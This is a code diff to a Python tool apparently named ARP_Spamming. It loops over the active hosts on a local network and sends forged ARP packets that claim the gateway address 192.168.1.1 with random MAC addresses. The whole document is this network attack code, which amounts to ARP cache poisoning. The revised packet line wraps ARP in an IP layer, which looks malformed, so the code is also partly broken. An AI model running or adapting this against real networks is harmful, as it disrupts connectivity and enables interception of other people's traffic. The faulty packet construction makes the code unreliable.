@@ -24,15 +24,16 @@ class ARP_Spamming:
 
         while self.running:
             # Talks to every machine and changes the ARP value
-            for x in self.active_hosts:
+            for host_dst in self.active_hosts:
                 count = 0
 
-                for y in self.active_hosts:
-                    # Makes sure values are not interchanged between the same machine
-                    if x is not y:
-                        self.send_arp_packet(x, y, self.rnd_mac_addresses[count])
+                # TODO Need to generate a random IP here
+                host_src = "192.168.1.1"
 
-                    count += 1
+
+                self.send_arp_packet(host_dst, host_src, self.rnd_mac_addresses[count])
+
+                count += 1
 
     def stop(self):
         self.running = False
@@ -48,7 +49,10 @@ class ARP_Spamming:
 
     def send_arp_packet(self, dst, src, mac, op_code=2):
         self.print_stats(dst, src, mac)
-        send(ARP(op=op_code, pdst=dst, psrc=src, hwdst=mac), verbose=0)
+
+        pkt = IP()/ARP(op=1, pdst=dst, psrc=src, hwdst=mac)
+
+        send(pkt, verbose=0)
         self.total_packets += 1
 
     def scan_local_network(self):
